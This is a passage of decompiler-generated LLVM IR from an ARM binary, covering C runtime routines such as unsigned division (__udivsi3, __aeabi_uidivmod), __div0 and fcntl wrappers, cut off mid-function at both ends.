  %v0_1109c = load i32, i32* %r0.global-to-local, align 4
  %v1_1109c = load i32, i32* %r1.global-to-local, align 4
  %v2_1109c = udiv i32 %v0_1109c, %v1_1109c
  store i32 %v2_1109c, i32* %r0.global-to-local, align 4
  %v2_110a0 = icmp ugt i32 %v1_1109c, %v0_1109c
  store i1 %v2_110a0, i1* %cpsr_z.global-to-local, align 1
  %v0_110a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_110a4 = add i32 %v0_110a4, -1
  store i32 %v1_110a4, i32* %r5.global-to-local, align 4
  br i1 %v2_110a0, label %dec_label_pc_110ac, label %dec_label_pc_11078

dec_label_pc_110ac:                               ; preds = %bb46
  %v0_110ac = load i32, i32* %sl.global-to-local, align 4
  %v2_110ac = icmp eq i32 %v0_110ac, 0
  store i1 %v2_110ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110ac, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_110ac
  %v3_110b0 = ptrtoint i32* %stack_var_-32 to i32
  %v3_110b4 = add i32 %v1_110a4, %v3_110b0
  store i32 %v3_110b4, i32* %r2.global-to-local, align 4
  %v4_110bc = add i32 %v3_110b4, -34
  %v5_110bc = inttoptr i32 %v4_110bc to i8*
  store i8 45, i8* %v5_110bc, align 1
  %v0_110c0.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_110c0.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_110c0.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_110ac
  %v1_110c0 = phi i32 [ %v1_110a4, %dec_label_pc_110ac ], [ %v1_110c0.pre, %.thread11 ]
  %v2_110c0 = add i32 %v1_110c0, 1
  store i32 %v2_110c0, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_110cc = phi i32 [ %v2_110c0, %.thread12 ], [ %v1_110c0.pre, %.thread11 ]
  %v0_110c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_110c4 = add i32 %v0_110c4, %v1_110cc
  %v3_110c4 = inttoptr i32 %v2_110c4 to i8*
  %v4_110c4 = load i8, i8* %v3_110c4, align 1
  %v6_110c4 = zext i8 %v4_110c4 to i32
  %v2_110c8 = icmp eq i8 %v4_110c4, 0
  store i1 %v2_110c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_110c4, i32* %r2.global-to-local, align 4
  br i1 %v2_110c8, label %dec_label_pc_11110, label %dec_label_pc_110d8.preheader

dec_label_pc_110d8.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_110d8

dec_label_pc_110d8:                               ; preds = %dec_label_pc_110d8.preheader, %dec_label_pc_110d8
  %v0_110d8 = phi i32 [ 0, %dec_label_pc_110d8.preheader ], [ %v1_110d8, %dec_label_pc_110d8 ]
  %v1_110d8 = add i32 %v0_110d8, 1
  store i32 %v1_110d8, i32* %r1.global-to-local, align 4
  %v2_110dc = add i32 %v1_110d8, %v2_110c4
  %v3_110dc = inttoptr i32 %v2_110dc to i8*
  %v4_110dc = load i8, i8* %v3_110dc, align 1
  %v2_110e0 = icmp eq i8 %v4_110dc, 0
  store i1 %v2_110e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110e0, label %dec_label_pc_110e8, label %dec_label_pc_110d8

dec_label_pc_110e8:                               ; preds = %dec_label_pc_110d8, %dec_label_pc_11110
  %v0_110ec25 = phi i32 [ %v6_110c4, %dec_label_pc_11110 ], [ %v1_110d8, %dec_label_pc_110d8 ]
  %v0_110e8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_110e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_110ec

dec_label_pc_110ec:                               ; preds = %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge, %dec_label_pc_110e8
  %v2_110f8 = phi i32 [ %v5_110f8, %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge ], [ %v0_110e8, %dec_label_pc_110e8 ]
  %v0_110f0 = phi i32 [ %v0_110f0.pre, %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge ], [ %v2_110c4, %dec_label_pc_110e8 ]
  %v0_110ec = phi i32 [ %v0_110ec.pre, %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge ], [ %v0_110ec25, %dec_label_pc_110e8 ]
  %v1_110ec = add i32 %v0_110ec, -1
  store i32 %v1_110ec, i32* %r1.global-to-local, align 4
  %v1_110f0 = inttoptr i32 %v0_110f0 to i8*
  %v2_110f0 = load i8, i8* %v1_110f0, align 1
  %v5_110f0 = add i32 %v0_110f0, 1
  store i32 %v5_110f0, i32* %r2.global-to-local, align 4
  %v3_110f4 = icmp eq i32 %v0_110ec, 0
  store i1 %v3_110f4, i1* %cpsr_z.global-to-local, align 1
  %v3_110f8 = inttoptr i32 %v2_110f8 to i8*
  store i8 %v2_110f0, i8* %v3_110f8, align 1
  %v4_110f8 = load i32, i32* %r0.global-to-local, align 4
  %v5_110f8 = add i32 %v4_110f8, 1
  store i32 %v5_110f8, i32* %r0.global-to-local, align 4
  br i1 %v3_110f4, label %dec_label_pc_11100, label %dec_label_pc_110ec.dec_label_pc_110ec_crit_edge

dec_label_pc_110ec.dec_label_pc_110ec_crit_edge:  ; preds = %dec_label_pc_110ec
  %v0_110ec.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_110f0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110ec

dec_label_pc_11100:                               ; preds = %dec_label_pc_110ec, %.thread1, %entry
  %v0_11100 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11100, i32* %r0.global-to-local, align 4
  ret i32 %v0_11100

dec_label_pc_11110:                               ; preds = %.thread11._crit_edge
  store i32 %v6_110c4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_110e8

; uselistorder directives
  uselistorder i32 %v5_110f8, { 1, 0 }
  uselistorder i1 %v3_110f4, { 1, 0 }
  uselistorder i32 %v0_110f0, { 1, 0 }
  uselistorder i32 %v1_110d8, { 0, 1, 3, 2 }
  uselistorder i32 %v6_110c4, { 1, 0 }
  uselistorder i32 %v2_110c4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_110c0.pre, { 1, 0 }
  uselistorder i32 %v1_110a4, { 1, 0, 3, 2 }
  uselistorder i32 %v2_1109c, { 1, 0 }
  uselistorder i32 %v3_11080, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_11020, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_110e8, { 1, 0 }
  uselistorder label %dec_label_pc_110d8, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_11044, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11118 = load i32, i32* @r1, align 4
  %v1_11118 = add i32 %v0_11118, -1
  store i32 %v1_11118, i32* %r2.global-to-local, align 4
  %v2_11118 = icmp eq i32 %v0_11118, 0
  %v7_11118 = icmp eq i32 %v0_11118, 1
  %v0_1111c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_11118, i32 %v0_1111c)
  br i1 %v2_11118, label %dec_label_pc_11200, label %dec_label_pc_11124

dec_label_pc_11124:                               ; preds = %entry
  %v0_11124 = load i32, i32* %r0.global-to-local, align 4
  %v1_11124 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_11124, %v1_11124
  br i1 %tmp, label %dec_label_pc_1112c, label %dec_label_pc_111b8

dec_label_pc_1112c:                               ; preds = %dec_label_pc_11124
  %v1_1112c = load i32, i32* %r2.global-to-local, align 4
  %v2_1112c = and i32 %v1_1112c, %v1_11124
  %v4_1112c = icmp eq i32 %v2_1112c, 0
  br i1 %v4_1112c, label %dec_label_pc_111c4, label %dec_label_pc_11134

dec_label_pc_11134:                               ; preds = %dec_label_pc_1112c
  %v3_11134 = icmp ult i32 %v1_11124, 536870912
  br i1 %v3_11134, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11134
  %v4_11138 = mul i32 %v1_11124, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11134, %.thread
  %v0_11158.pr36.ph = phi i32 [ %v4_11138, %.thread ], [ %v1_11124, %dec_label_pc_11134 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11134 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_11158.pr36 = phi i32 [ %v4_1114c, %bb81 ], [ %v0_11158.pr36.ph, %.preheader.preheader ]
  %v1_11150 = phi i32 [ %v4_11150, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_11144 = icmp ugt i32 %v0_11158.pr36, 268435455
  br i1 %v2_11144, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11158thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_11148 = icmp ult i32 %v0_11158.pr36, %v0_11124
  br i1 %v4_11148, label %bb80, label %dec_label_pc_11158thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_1114c = and i32 %v0_11158.pr36, 268435456
  %v3_1114c = icmp eq i32 %v2_1114c, 0
  %v4_1114c = mul i32 %v0_11158.pr36, 16
  br i1 %v3_1114c, label %bb81, label %dec_label_pc_11158.loopexit

bb81:                                             ; preds = %bb80
  %v2_11150 = and i32 %v1_11150, 268435456
  %v3_11150 = icmp eq i32 %v2_11150, 0
  %v4_11150 = mul i32 %v1_11150, 16
  br i1 %v3_11150, label %.preheader, label %dec_label_pc_11158thread-pre-split.loopexit.loopexit

dec_label_pc_11158thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1116448.ph = phi i32 [ %v1_11150, %bb ], [ %v4_11150, %bb81 ]
  %v0_11158.pr38.ph = phi i32 [ %v0_11158.pr36, %bb ], [ %v4_1114c, %bb81 ]
  br label %dec_label_pc_11158thread-pre-split.loopexit

dec_label_pc_11158thread-pre-split.loopexit:      ; preds = %dec_label_pc_11158thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1116448 = phi i32 [ %v1_11150, %.thread2 ], [ %v1_1116448.ph, %dec_label_pc_11158thread-pre-split.loopexit.loopexit ]
  %v0_11158.pr38 = phi i32 [ %v0_11158.pr36, %.thread2 ], [ %v0_11158.pr38.ph, %dec_label_pc_11158thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11158thread-pre-split

dec_label_pc_11158thread-pre-split:               ; preds = %dec_label_pc_11158thread-pre-split.loopexit, %bb83
  %v1_1116446 = phi i32 [ %v1_1116448, %dec_label_pc_11158thread-pre-split.loopexit ], [ %v3_11164, %bb83 ]
  %v0_11158.pr = phi i32 [ %v0_11158.pr38, %dec_label_pc_11158thread-pre-split.loopexit ], [ %v3_11160, %bb83 ]
  br label %dec_label_pc_11158

dec_label_pc_11158.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_11158

dec_label_pc_11158:                               ; preds = %dec_label_pc_11158.loopexit, %dec_label_pc_11158thread-pre-split
  %v1_11164 = phi i32 [ %v1_1116446, %dec_label_pc_11158thread-pre-split ], [ %v1_11150, %dec_label_pc_11158.loopexit ]
  %v1_11160 = phi i32 [ %v0_11158.pr, %dec_label_pc_11158thread-pre-split ], [ %v4_1114c, %dec_label_pc_11158.loopexit ]
  %v2_11158 = icmp slt i32 %v1_11160, 0
  br i1 %v2_11158, label %dec_label_pc_1116c, label %bb82

bb82:                                             ; preds = %dec_label_pc_11158
  %v4_1115c = icmp ult i32 %v1_11160, %v0_11124
  br i1 %v4_1115c, label %bb83, label %dec_label_pc_1116c

bb83:                                             ; preds = %bb82
  %v3_11160 = mul i32 %v1_11160, 2
  %v2_11164 = icmp slt i32 %v1_11164, 0
  %v3_11164 = mul i32 %v1_11164, 2
  br i1 %v2_11164, label %dec_label_pc_1116c, label %dec_label_pc_11158thread-pre-split

dec_label_pc_1116c:                               ; preds = %bb82, %dec_label_pc_11158, %bb83
  %v2_1117859 = phi i32 [ %v3_11164, %bb83 ], [ %v1_11164, %bb82 ], [ %v1_11164, %dec_label_pc_11158 ]
  %v1_1117051 = phi i32 [ %v3_11160, %bb83 ], [ %v1_11160, %bb82 ], [ %v1_11160, %dec_label_pc_11158 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11170

dec_label_pc_11170:                               ; preds = %.thread11, %dec_label_pc_1116c
  %v1_111a4 = phi i32 [ %v4_111a4, %.thread11 ], [ %v2_1117859, %dec_label_pc_1116c ]
  %v1_11178 = phi i32 [ %v0_111b0, %.thread11 ], [ 0, %dec_label_pc_1116c ]
  %v1_111a8 = phi i32 [ %v4_111a8, %.thread11 ], [ %v1_1117051, %dec_label_pc_1116c ]
  %v1_11174 = phi i32 [ %v0_111a0, %.thread11 ], [ %v0_11124, %dec_label_pc_1116c ]
  %v3_11170 = icmp ult i32 %v1_11174, %v1_111a8
  br i1 %v3_11170, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_11170
  %v3_11174 = sub i32 %v1_11174, %v1_111a8
  store i32 %v3_11174, i32* %r0.global-to-local, align 4
  %v3_11178 = or i32 %v1_11178, %v1_111a4
  store i32 %v3_11178, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11170, %bb84
  %v1_11180 = phi i32 [ %v1_11174, %dec_label_pc_11170 ], [ %v3_11174, %bb84 ]
  %v1_11184 = phi i32 [ %v1_11178, %dec_label_pc_11170 ], [ %v3_11178, %bb84 ]
  %v4_1117c = udiv i32 %v1_111a8, 2
  %v6_1117c = icmp ult i32 %v1_11180, %v4_1117c
  br i1 %v6_1117c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_11180 = urem i32 %v1_111a8, 2
  %v4_11180 = icmp eq i32 %v3_11180, 0
  %v6_11180 = sub i32 %v1_11180, %v4_1117c
  store i32 %v6_11180, i32* %r0.global-to-local, align 4
  br i1 %v4_11180, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_11184 = udiv i32 %v1_111a4, 2
  %v6_11184 = or i32 %v1_11184, %v5_11184
  store i32 %v6_11184, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_1118c = phi i32 [ %v6_11180, %bb85 ], [ %v1_11180, %.thread7 ], [ %v6_11180, %bb86 ]
  %v1_11190 = phi i32 [ %v1_11184, %bb85 ], [ %v1_11184, %.thread7 ], [ %v6_11184, %bb86 ]
  %v4_11188 = udiv i32 %v1_111a8, 4
  %v6_11188 = icmp ult i32 %v1_1118c, %v4_11188
  br i1 %v6_11188, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_1118c = and i32 %v1_111a8, 2
  %v4_1118c = icmp eq i32 %v3_1118c, 0
  %v6_1118c = sub i32 %v1_1118c, %v4_11188
  store i32 %v6_1118c, i32* %r0.global-to-local, align 4
  br i1 %v4_1118c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11190 = udiv i32 %v1_111a4, 4
  %v6_11190 = or i32 %v1_11190, %v5_11190
  store i32 %v6_11190, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_11198 = phi i32 [ %v6_1118c, %bb87 ], [ %v1_1118c, %.thread8 ], [ %v6_1118c, %bb88 ]
  %v1_1119c = phi i32 [ %v1_11190, %bb87 ], [ %v1_11190, %.thread8 ], [ %v6_11190, %bb88 ]
  %v4_11194 = udiv i32 %v1_111a8, 8
  %v6_11194 = icmp ult i32 %v1_11198, %v4_11194
  br i1 %v6_11194, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11198 = and i32 %v1_111a8, 4
  %v4_11198 = icmp eq i32 %v3_11198, 0
  %v6_11198 = sub i32 %v1_11198, %v4_11194
  store i32 %v6_11198, i32* %r0.global-to-local, align 4
  br i1 %v4_11198, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1119c = udiv i32 %v1_111a4, 8
  %v6_1119c = or i32 %v1_1119c, %v5_1119c
  store i32 %v6_1119c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_111b0 = phi i32 [ %v1_1119c, %bb89 ], [ %v1_1119c, %.thread9 ], [ %v6_1119c, %bb90 ]
  %v0_111a0 = phi i32 [ %v6_11198, %bb89 ], [ %v1_11198, %.thread9 ], [ %v6_11198, %bb90 ]
  %v2_111a0 = icmp eq i32 %v0_111a0, 0
  br i1 %v2_111a0, label %dec_label_pc_111b0, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_111a4, 16
  br i1 %tmp138, label %dec_label_pc_111b0, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_111a4 = udiv i32 %v1_111a4, 16
  %v4_111a8 = udiv i32 %v1_111a8, 16
  br label %dec_label_pc_11170

dec_label_pc_111b0:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_111b0, i32* %r0.global-to-local, align 4
  ret i32 %v0_111b0

dec_label_pc_111b8:                               ; preds = %dec_label_pc_11124
  %v9_11124 = icmp eq i32 %v0_11124, %v1_11124
  %. = zext i1 %v9_11124 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_111c4:                               ; preds = %dec_label_pc_1112c
  %v2_111c4 = icmp ugt i32 %v1_11124, 65535
  br i1 %v2_111c4, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_111c4
  %v2_111c8 = and i32 %v1_11124, 32768
  %v3_111c8 = icmp eq i32 %v2_111c8, 0
  %v4_111c8 = udiv i32 %v1_11124, 65536
  br i1 %v3_111c8, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_111c4
  %v0_111d465 = phi i32 [ %v1_11124, %dec_label_pc_111c4 ], [ %v4_111c8, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_111d8 = phi i32 [ %v0_111d465, %.thread16 ], [ %v4_111c8, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_111d4 = icmp ugt i32 %v1_111d8, 255
  br i1 %v2_111d4, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_111d8 = and i32 %v1_111d8, 128
  %v3_111d8 = icmp eq i32 %v2_111d8, 0
  %v4_111d8 = udiv i32 %v1_111d8, 256
  br i1 %v3_111d8, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_111dc = or i32 %storemerge, 8
  store i32 %v2_111dc, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_111e8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_111dc, %bb98 ]
  %v1_111e4 = phi i32 [ %v1_111d8, %bb96 ], [ %v4_111d8, %bb97 ], [ %v4_111d8, %bb98 ]
  %v2_111e0 = icmp ugt i32 %v1_111e4, 15
  br i1 %v2_111e0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_111e4 = and i32 %v1_111e4, 8
  %v3_111e4 = icmp eq i32 %v2_111e4, 0
  %v4_111e4 = udiv i32 %v1_111e4, 16
  br i1 %v3_111e4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_111e8 = add nsw i32 %v1_111e8, 4
  store i32 %v2_111e8, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_111f0 = phi i32 [ %v1_111e8, %.thread17 ], [ %v1_111e8, %bb99 ], [ %v2_111e8, %bb100 ]
  %v5_111f4 = phi i32 [ %v1_111e4, %.thread17 ], [ %v4_111e4, %bb99 ], [ %v4_111e4, %bb100 ]
  %v2_111ec = icmp ugt i32 %v5_111f4, 3
  %v7_111ec = icmp eq i32 %v5_111f4, 4
  %v2_111f0 = xor i1 %v7_111ec, true
  %v3_111f0 = and i1 %v2_111ec, %v2_111f0
  br i1 %v3_111f0, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_111f0 = add nsw i32 %v4_111f0, 3
  store i32 %v5_111f0, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_111f4 = phi i32 [ %v4_111f0, %.thread18 ], [ %v5_111f0, %bb101 ]
  %v2_111f4 = xor i1 %v2_111ec, true
  %v3_111f4 = or i1 %v7_111ec, %v2_111f4
  br i1 %v3_111f4, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_111f4 = udiv i32 %v5_111f4, 2
  %v9_111f4 = add i32 %v4_111f4, %v8_111f4
  store i32 %v9_111f4, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_111f8 = phi i32 [ %v4_111f4, %bb102 ], [ %v9_111f4, %bb103 ]
  %v6_111f8 = lshr i32 %v0_11124, %v1_111f8
  store i32 %v6_111f8, i32* %r0.global-to-local, align 4
  ret i32 %v6_111f8

dec_label_pc_11200:                               ; preds = %entry
  %v0_11204 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_111f4, { 1, 0 }
  uselistorder i1 %v7_111ec, { 1, 0 }
  uselistorder i32 %v4_111e4, { 1, 0 }
  uselistorder i32 %v1_111e4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_111dc, { 1, 0 }
  uselistorder i32 %v4_111d8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_111d8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_111c8, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_111a0, { 1, 0 }
  uselistorder i32 %v0_111b0, { 1, 0, 2 }
  uselistorder i32 %v4_11194, { 1, 0 }
  uselistorder i32 %v1_1119c, { 1, 2, 0 }
  uselistorder i32 %v4_11188, { 1, 0 }
  uselistorder i32 %v1_11190, { 1, 2, 0 }
  uselistorder i32 %v4_1117c, { 1, 0 }
  uselistorder i32 %v1_11184, { 1, 2, 0 }
  uselistorder i32 %v1_111a8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11178, { 1, 0 }
  uselistorder i32 %v1_111a4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11164, { 1, 0 }
  uselistorder i32 %v3_11160, { 1, 0 }
  uselistorder i32 %v1_11160, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11164, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11150, { 1, 0 }
  uselistorder i32 %v4_1114c, { 2, 1, 0 }
  uselistorder i32 %v1_11150, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11158.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_11124, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_11124, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_11118, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 4, 0, 1, 2, 3 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_111b0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1116c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11158thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11218 = udiv i32 %arg1, %arg2
  ret i32 %v2_11218
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_11234 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_11234
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_11250 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_11250, 2
  br i1 %tmp, label %dec_label_pc_1128c, label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_112c0, label %dec_label_pc_1127c

dec_label_pc_1127c:                               ; preds = %dec_label_pc_11268
  %v0_11280 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_112b4

dec_label_pc_1128c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_112a8, label %dec_label_pc_112c0

dec_label_pc_112a8:                               ; preds = %dec_label_pc_1128c
  %v0_112ac = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_112b4

dec_label_pc_112b4:                               ; preds = %dec_label_pc_1127c, %dec_label_pc_112a8
  %storemerge2 = phi i32 [ %v0_11280, %dec_label_pc_1127c ], [ %v0_112ac, %dec_label_pc_112a8 ]
  %storemerge.in = load i16, i16* @global_var_22294.357, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_112b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_112b4 = sub i32 0, %v0_112b4
  store i32 %v1_112b4, i32* %r2.global-to-local, align 4
  %v3_112b8 = add i32 %storemerge, %storemerge2
  %v4_112b8 = inttoptr i32 %v3_112b8 to i32*
  store i32 %v1_112b4, i32* %v4_112b8, align 4
  br label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_11268, %dec_label_pc_1128c, %dec_label_pc_112b4
  %storemerge1 = phi i32 [ -1, %dec_label_pc_112b4 ], [ %arg1, %dec_label_pc_1128c ], [ %arg1, %dec_label_pc_11268 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_112c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_112b4, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_112d8 = load i32, i32* @r2, align 4
  %v9_112d8 = load i32, i32* @r3, align 4
  store i32 %v9_112d8, i32* %stack_var_-4, align 4
  %v3_112dc = load i32, i32* @r4, align 4
  store i32 %v3_112dc, i32* %stack_var_-32, align 4
  %v6_112dc = load i32, i32* @r5, align 4
  %v12_112dc = load i32, i32* @r7, align 4
  %v4_112ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_112f4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_112f4, i32* @r3, align 4
  %v2_112f8 = icmp eq i32 %v4_112ec, 0
  %v0_11300 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11300, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_112d8, i32* @r4, align 4
  br i1 %v2_112f8, label %dec_label_pc_1131c, label %dec_label_pc_11310

dec_label_pc_11310:                               ; preds = %entry
  %v7_11310 = icmp eq i32 %arg2, 7
  br i1 %v7_11310, label %dec_label_pc_1135c, label %bb

bb:                                               ; preds = %dec_label_pc_11310
  %v8_11314 = icmp eq i32 %arg2, 14
  br i1 %v8_11314, label %dec_label_pc_1135c, label %dec_label_pc_1131c

dec_label_pc_1131c:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_11300, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_11300, -4095
